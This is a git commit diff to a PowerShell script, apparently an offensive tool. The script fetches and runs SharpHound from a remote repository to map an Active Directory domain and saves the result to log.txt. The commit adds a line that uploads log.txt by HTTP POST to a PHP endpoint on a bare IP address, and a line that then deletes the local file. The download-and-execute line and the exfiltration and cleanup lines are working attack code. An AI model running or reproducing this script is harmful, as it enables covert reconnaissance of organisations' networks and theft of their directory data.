4ccaf6d3d2761caf2d3f89c2beceecd265ad245d
mariffy <111181799+mariffy@users.noreply.github.com>
2023-11-12 03:54:26 +0800

    Update sharpH.ps1

--- sharpH.ps1
+++ sharpH.ps1
@@ -39,3 +39,5 @@ $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1')
 $sharphoundOutput = Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
 $sharphoundOutput | Out-File -FilePath "log.txt" -Encoding UTF8
+Invoke-WebRequest -Uri "http://18.134.172.169/29622395-3621-4094-996b-1fd1ca730297.php" -Method POST -ContentType 'text/plain' -InFile "log.txt"
+Remove-Item -Path "log.txt"
